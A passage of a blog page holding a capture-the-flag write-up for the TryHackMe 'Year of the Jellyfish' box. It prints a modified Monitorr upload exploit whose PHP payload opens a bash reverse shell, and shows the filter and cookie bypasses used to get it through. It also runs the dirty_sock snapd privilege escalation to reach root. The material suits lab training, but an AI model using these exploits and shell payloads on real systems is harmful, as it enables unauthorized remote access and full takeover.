+    print (&quot;A shell script should be uploaded. Now we try to execute it&quot;)
+    url = sys.argv[1] + &quot;/assets/data/usrimg/she_ll.php&quot;
+    headers = {&quot;User-Agent&quot;: &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:82.0) Gecko/20100101 Firefox/82.0&quot;, &quot;Accept&quot;: &quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8&quot;, &quot;Accept-Language&quot;: &quot;en-US,en;q=0.5&quot;, &quot;Accept-Encoding&quot;: &quot;gzip, deflate&quot;, &quot;Connection&quot;: &quot;close&quot;, &quot;Upgrade-Insecure-Requests&quot;: &quot;1&quot;}
+    requests.get(url, headers=headers, verify = False)
+</code></pre><blockquote>
+<p>Let&rsquo;s run the exploit</p>
+</blockquote>
+<pre><code>root@kali:~/Desktop/tryhackme/YOJ# python3 48980.py https://monitorr.robyns-petshop.thm/ 10.6.29.240 443
+/usr/local/lib/python3.9/site-packages/urllib3/connectionpool.py:979: InsecureRequestWarning: Unverified HTTPS request is being made to host 'monitorr.robyns-petshop.thm'. Adding certificate verification is strongly advised. See: https://urllib3.readthedocs.io/en/latest/advanced-usage.html#ssl-warnings
+  warnings.warn(
+&lt;div id='uploadreturn'&gt;You are an exploit.&lt;/div&gt;&lt;div id='uploaderror'&gt;ERROR: she_ll.php was not uploaded.&lt;/div&gt;&lt;/div&gt;
+A shell script should be uploaded. Now we try to execute it
+/usr/local/lib/python3.9/site-packages/urllib3/connectionpool.py:979: InsecureRequestWarning: Unverified HTTPS request is being made to host 'monitorr.robyns-petshop.thm'. Adding certificate verification is strongly advised. See: https://urllib3.readthedocs.io/en/latest/advanced-usage.html#ssl-warnings
+  warnings.warn(
+
+</code></pre><p>How the hell it knows 😵?</p>
+<blockquote>
+<p>Should be Python User-Agent or would be if the exploit wasn’t explicitly spoofing our user-agent already. Perhaps a cookie?</p>
+</blockquote>
+<p>Check the 🍪 in DevTools</p>
+<p>Found a cookie called <code>isHuman</code> and value set to <code>1</code></p>
+<p>Modified exploit :</p>
+<pre><code>#!/usr/bin/python
+# -*- coding: UTF-8 -*-
+
+# Exploit Title: Monitorr 1.7.6m - Remote Code Execution (Unauthenticated)
+# Date: September 12, 2020
+# Exploit Author: Lyhin's Lab
+# Detailed Bug Description: https://lyhinslab.org/index.php/2020/09/12/how-the-white-box-hacking-works-authorization-bypass-and-remote-code-execution-in-monitorr-1-7-6/
+# Software Link: https://github.com/Monitorr/Monitorr
+# Version: 1.7.6m
+# Tested on: Ubuntu 19
+
+import requests
+import os
+import sys
+
+if len (sys.argv) != 4:
+	print (&quot;specify params in format: python &quot; + sys.argv[0] + &quot; target_url lhost lport&quot;)
+else:
+    url = sys.argv[1] + &quot;/assets/php/upload.php&quot;
+    headers = {&quot;User-Agent&quot;: &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:82.0) Gecko/20100101 Firefox/82.0&quot;, &quot;Accept&quot;: &quot;text/plain, */*; q=0.01&quot;, &quot;Accept-Language&quot;: &quot;en-US,en;q=0.5&quot;, &quot;Accept-Encoding&quot;: &quot;gzip, deflate&quot;, &quot;X-Requested-With&quot;: &quot;XMLHttpRequest&quot;, &quot;Content-Type&quot;: &quot;multipart/form-data; boundary=---------------------------31046105003900160576454225745&quot;, &quot;Origin&quot;: sys.argv[1], &quot;Connection&quot;: &quot;close&quot;, &quot;Referer&quot;: sys.argv[1]}
+
+    data = &quot;-----------------------------31046105003900160576454225745\r\nContent-Disposition: form-data; name=\&quot;fileToUpload\&quot;; filename=\&quot;she_ll.php\&quot;\r\nContent-Type: image/gif\r\n\r\nGIF89a213213123&lt;?php shell_exec(\&quot;/bin/bash -c 'bash -i &gt;&amp; /dev/tcp/&quot;+sys.argv[2] +&quot;/&quot; + sys.argv[3] + &quot; 0&gt;&amp;1'\&quot;);\r\n\r\n-----------------------------31046105003900160576454225745--\r\n&quot;
+
+    cookies = {
+    &quot;isHuman&quot; : &quot;1&quot;,
+    }
+
+    r = requests.post(url, headers=headers, data=data,verify=False,cookies = cookies)
+    
+
+    print (&quot;A shell script should be uploaded. Now we try to execute it&quot;)
+    url = sys.argv[1] + &quot;/assets/data/usrimg/she_ll.php&quot;
+    headers = {&quot;User-Agent&quot;: &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:82.0) Gecko/20100101 Firefox/82.0&quot;, &quot;Accept&quot;: &quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8&quot;, &quot;Accept-Language&quot;: &quot;en-US,en;q=0.5&quot;, &quot;Accept-Encoding&quot;: &quot;gzip, deflate&quot;, &quot;Connection&quot;: &quot;close&quot;, &quot;Upgrade-Insecure-Requests&quot;: &quot;1&quot;}
+    requests.get(url, headers=headers, verify=False,cookies = cookies)
+</code></pre><p>Well it worked !!</p>
+<h3 id="filter-bypass">Filter bypass<a href="#filter-bypass" class="anchor" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 7h3a5 5 0 0 1 5 5 5 5 0 0 1-5 5h-3m-6 0H6a5 5 0 0 1-5-5 5 5 0 0 1 5-5h3"></path><line x1="8" y1="12" x2="16" y2="12"></line></svg></a></h3>
+<p>Finally we have convinced the Web application that we are human, but it&rsquo;s still not letting us to upload anything.</p>
+<ul>
+<li>
+<p>A regex to see if <code>php</code> appears in the filename. This thing can be bypassed by using an alternative extension such as <code>.phtml</code> or <code>.phar</code></p>
+</li>
+<li>
+<p><code>she_ll.php</code> changed to <code>she_ll.jpg.phtml</code></p>
+</li>
+</ul>
+<p><strong>This is the final exploit</strong></p>
+<pre><code>import requests
+import os
+import sys
+import random
+import string
+
+if len (sys.argv) != 4:
+	print (&quot;specify params in format: python &quot; + sys.argv[0] + &quot; target_url lhost lport&quot;)
+else:
+    url = sys.argv[1] + &quot;/assets/php/upload.php&quot;
+    headers = {&quot;User-Agent&quot;: &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:82.0) Gecko/20100101 Firefox/82.0&quot;, 
+    &quot;Accept&quot;: &quot;text/plain, */*; q=0.01&quot;, 
+    &quot;Accept-Language&quot;: &quot;en-US,en;q=0.5&quot;, 
+    &quot;Accept-Encoding&quot;: &quot;gzip, deflate&quot;, &quot;X-Requested-With&quot;: &quot;XMLHttpRequest&quot;, &quot;Content-Type&quot;: &quot;multipart/form-data; boundary=---------------------------31046105003900160576454225745&quot;, 
+    &quot;Origin&quot;: sys.argv[1], 
+    &quot;Connection&quot;: &quot;close&quot;, 
+    &quot;Referer&quot;: sys.argv[1]}
+    filename = &quot;&quot;.join([random.choice(string.ascii_lowercase) for _ in range(random.randint(5,12))])
+
+    data = f&quot;-----------------------------31046105003900160576454225745\r\nContent-Disposition: form-data; name=\&quot;fileToUpload\&quot;; filename=\&quot;{filename}.gif.phtml\&quot;\r\nContent-Type: image/gif\r\n\r\nGIF89a213213123&lt;?php shell_exec(\&quot;/bin/bash -c 'bash -i &gt;&amp; /dev/tcp/&quot;+sys.argv[2] +&quot;/&quot; + sys.argv[3] + &quot; 0&gt;&amp;1'\&quot;);\r\n\r\n-----------------------------31046105003900160576454225745--\r\n&quot;
+
+    cookies = {
+    &quot;isHuman&quot; : &quot;1&quot;
+    }
+
+    r = requests.post(url, headers=headers, data=data, verify=False, cookies = cookies)
+    print(r.text)
+
+    print (&quot;A shell script should be uploaded. Now we try to execute it&quot;)
+    url = sys.argv[1] + f&quot;/assets/data/usrimg/{filename}.gif.phtml&quot;
+    headers = {&quot;User-Agent&quot;: &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:82.0) Gecko/20100101 Firefox/82.0&quot;, &quot;Accept&quot;: &quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8&quot;, &quot;Accept-Language&quot;: &quot;en-US,en;q=0.5&quot;, &quot;Accept-Encoding&quot;: &quot;gzip, deflate&quot;, &quot;Connection&quot;: &quot;close&quot;, &quot;Upgrade-Insecure-Requests&quot;: &quot;1&quot;}
+    requests.get(url, headers=headers, verify=False, cookies = cookies)
+</code></pre><blockquote>
+<p>Note: Here, the exploit produces random names with an extension <code>.phtml</code></p>
+</blockquote>
+<p>Let&rsquo;s exploit to get a reverse shell ..!</p>
+<p><img src="/img/blog/YOJ2.png" alt="img"></p>
+<blockquote>
+<p>Hurray! we got the shell. All we need to do is find the flags</p>
+</blockquote>
+<ol>
+<li>We need to stabilize the shell
+<ul>
+<li><code>python3 -c &quot;import pty; pty.spawn('/bin/bash')&quot;</code></li>
+<li><code>ctrl + z</code></li>
+<li><code>stty raw -echo</code></li>
+<li><code>export TERM=xterm</code></li>
+</ul>
+</li>
+<li>First flag - <code>www-data@petshop:/var/www$cat flag1.txt</code></li>
+</ol>
+<h3 id="root-privilege-escalation">Root privilege escalation<a href="#root-privilege-escalation" class="anchor" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 7h3a5 5 0 0 1 5 5 5 5 0 0 1-5 5h-3m-6 0H6a5 5 0 0 1-5-5 5 5 0 0 1 5-5h3"></path><line x1="8" y1="12" x2="16" y2="12"></line></svg></a></h3>
+<p>We need to run <code>linPEAS.sh</code>. I have already downloaded <a href="https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS">linPEAS </a></p>
+<p><img src="/img/blog/YOJ3.png" alt="img"></p>
+<p><strong>Ngrok allows you to expose a web server running on your local machine to the internet. Just tell ngrok what port your web server is listening on.</strong></p>
+<p><a href="https://ngrok.com/docs">Ngrok Documentation</a></p>
+<p><a href="https://ngrok.com/download">Download Ngrok</a></p>
+<p><strong>Updog is a replacement for Python&rsquo;s <code>SimpleHTTPServer</code>. It allows uploading and downloading via HTTP/S, can set ad hoc SSL certificates and use HTTP basic auth.</strong></p>
+<pre><code>pip install updog
+</code></pre><pre><code>www-data@petshop:/dev/shm$ chmod +x linpeas.sh
+www-data@petshop:/dev/shm$ ./linpeas.sh
+ Starting linpeas. Caching Writable Folders...
+</code></pre><blockquote>
+<p>linpeas flagged <strong>HTTP sockets</strong>
+<a href="https://book.hacktricks.xyz/linux-unix/privilege-escalation#sockets">Sockets</a></p>
+</blockquote>
+<blockquote>
+<p>Check this for Basic Linux Privilege Escalation <a href="https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/">LPE</a></p>
+</blockquote>
+<p><strong>What applications are installed? What version are they? Are they currently running?</strong></p>
+<pre><code>www-data@petshop:/dev/shm$ ls -alh /usr/bin/
+</code></pre><p>After the run, I found interesting about <code>Snapd</code> checking this with searchsploit.</p>
+<pre><code>root@kali:~# searchsploit snapd 2.32.5
+----------------------------------------------------------------------------------------------------------------
+ Exploit Title                                                                 |  Path
+----------------------------------------------------------------------------------------------------------------
+snapd &lt; 2.37 (Ubuntu) - 'dirty_sock' Local Privilege Escalation (1)            | linux/local/46361.py
+snapd &lt; 2.37 (Ubuntu) - 'dirty_sock' Local Privilege Escalation (2)            | linux/local/46362.py
+----------------------------------------------------------------------------------------------------------------
+</code></pre><p>Actually it&rsquo;s a dirty Sock exploit. Learn more about <a href="https://0xdf.gitlab.io/2019/02/13/playing-with-dirty-sock.html">DirtySock</a></p>
+<p>Let&rsquo;s Copy Dirty Sock 46362.py</p>
+<pre><code>root@kali:~# searchsploit -m linux/local/46362.py
+  Exploit: snapd &lt; 2.37 (Ubuntu) - 'dirty_sock' Local Privilege Escalation (2)
+      URL: https://www.exploit-db.com/exploits/46362
+     Path: /usr/share/exploitdb/exploits/linux/local/46362.py
+File Type: Python script, ASCII text executable, with very long lines, with CRLF line terminators
+
+Copied to: /root/46362.py
+</code></pre><p>Let&rsquo;s run the exploit to be a <strong>Root user</strong></p>
+<p><img src="/img/blog/YOJ4.png" alt="img"></p>
+<pre><code>www-data@petshop:/dev/shm$ python3 dirty.py
+
+      ___  _ ____ ___ _   _     ____ ____ ____ _  _ 
+      |  \ | |__/  |   \_/      [__  |  | |    |_/  
+      |__/ | |  \  |    |   ___ ___] |__| |___ | \_ 
+                       (version 2)
+
+//=========[]==========================================\\
+|| R&amp;D     || initstring (@init_string)                ||
+|| Source  || https://github.com/initstring/dirty_sock ||
+|| Details || https://initblog.com/2019/dirty-sock     ||
+\\=========[]==========================================//
+
+
+[+] Slipped dirty sock on random socket file: /tmp/lwczffgrbu;uid=0;
+[+] Binding to socket file...
+[+] Connecting to snapd API...
+[+] Deleting trojan snap (and sleeping 5 seconds)...
+[+] Installing the trojan snap (and sleeping 8 seconds)...
+[+] Deleting trojan snap (and sleeping 5 seconds)...
+
+
+
+********************
+Success! You can now `su` to the following account and use sudo:
+   username: dirty_sock
+   password: dirty_sock
+********************
+</code></pre><p>That&rsquo;s it we got username and password</p>
+<pre><code>www-data@petshop:/dev/shm$ su dirty_sock
+Password: dirty_sock
+
+To run a command as administrator (user &quot;root&quot;), use &quot;sudo &lt;command&gt;&quot;.
+See &quot;man sudo_root&quot; for details.
+
+dirty_sock@petshop:/dev/shm$ sudo whoami
+[sudo] password for dirty_sock: dirty_sock
+
+root
+dirty_sock@petshop:/dev/shm$ sudo bash
+root@petshop:/dev/shm# 
+</code></pre><blockquote>
+<p>Hurray! Now I&rsquo;m the root user</p>
+</blockquote>
+<p>Flag 2 - <code>root@petshop:/root# cat root.txt</code></p>
+
+			</div>
+			<hr class="post-end">
+			<footer class="post-info">
+				<p>
+					<svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-tag meta-icon"><path d="M20.59 13.41l-7.17 7.17a2 2 0 0 1-2.83 0L2 12V2h10l8.59 8.59a2 2 0 0 1 0 2.82z"></path><line x1="7" y1="7" x2="7" y2="7"></line></svg><span class="tag"><a href="https://riteshpuvvada.github.io/tags/bypassing">Bypassing</a></span><span class="tag"><a href="https://riteshpuvvada.github.io/tags/upload">Upload</a></span><span class="tag"><a href="https://riteshpuvvada.github.io/tags/data">Data</a></span><span class="tag"><a href="https://riteshpuvvada.github.io/tags/thm">THM</a></span><span class="tag"><a href="https://riteshpuvvada.github.io/tags/writeup">Writeup</a></span><span class="tag"><a href="https://riteshpuvvada.github.io/tags/year-of-the-jellyfish">Year-of-the-Jellyfish</a></span><span class="tag"><a href="https://riteshpuvvada.github.io/tags/riteshpuvvada">RiteshPuvvada</a></span>
+				</p>
+				<p><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-file-text"><path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"></path><polyline points="14 2 14 8 20 8"></polyline><line x1="16" y1="13" x2="8" y2="13"></line><line x1="16" y1="17" x2="8" y2="17"></line><polyline points="10 9 9 9 8 9"></polyline></svg>2826 Words</p>
+				<p><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-calendar"><rect x="3" y="4" width="18" height="18" rx="2" ry="2"></rect><line x1="16" y1="2" x2="16" y2="6"></line><line x1="8" y1="2" x2="8" y2="6"></line><line x1="3" y1="10" x2="21" y2="10"></line></svg>2021-05-20 12:05 &#43;0530</p>
+			</footer>
+		</article>
+		<div class="post-nav thin">
+			<a class="prev-post" href="https://riteshpuvvada.github.io/posts/sql_writeup/">
+				<span class="post-nav-label">Older&nbsp;<svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-arrow-right"><line x1="5" y1="12" x2="19" y2="12"></line><polyline points="12 5 19 12 12 19"></polyline></svg></span><br><span>SQL Injection</span>
+			</a>
+		</div>
+		<div id="comments" class="thin">
+</div>
+	</main>
+
+	<footer id="site-footer" class="section-inner thin animated fadeIn faster">
+		<p>&copy; 2021 <a href="https://riteshpuvvada.github.io/">Ritesh Puvvada</a> &#183; <a href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank" rel="noopener">CC BY-NC 4.0</a></p>
+		<p>
+			Made with <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> &#183; Theme <a href="https://github.com/Track3/hermit" target="_blank" rel="noopener">Hermit</a> &#183; <a href="https://riteshpuvvada.github.io/posts/index.xml" target="_blank" title="rss"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-rss"><path d="M4 11a9 9 0 0 1 9 9"></path><path d="M4 4a16 16 0 0 1 16 16"></path><circle cx="5" cy="19" r="1"></circle></svg></a>
+		</p>
+	</footer>
+
+
+
+	<script src="https://riteshpuvvada.github.io/js/bundle.min.7d8545daa55d62427355498dd8da13f98ff79a7938ce7d2a5e2ae1ec0de3beb8.js" integrity="sha256-fYVF2qVdYkJzVUmN2NoT+Y/3mnk4zn0qXirh7A3jvrg=" crossorigin="anonymous"></script>
+	
+
+</body>
+
+</html>
